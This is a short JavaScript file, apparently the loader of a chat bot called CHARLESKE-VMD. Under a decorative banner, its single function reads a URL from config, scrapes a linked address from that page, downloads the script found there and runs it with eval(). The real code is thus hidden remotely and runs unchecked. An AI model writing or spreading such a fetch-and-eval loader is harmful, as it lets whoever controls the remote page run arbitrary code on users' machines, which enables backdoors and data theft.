//  [CHARLESKE-VMD]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Charleske                                    
//  >> Version: 5.0

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchURLUrl() {
  try {
    const response = await axios.get(adams.CHARLESKE_MD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("URL")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('URL not found 😭');
    }

    console.log('URL loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchURLUrl();
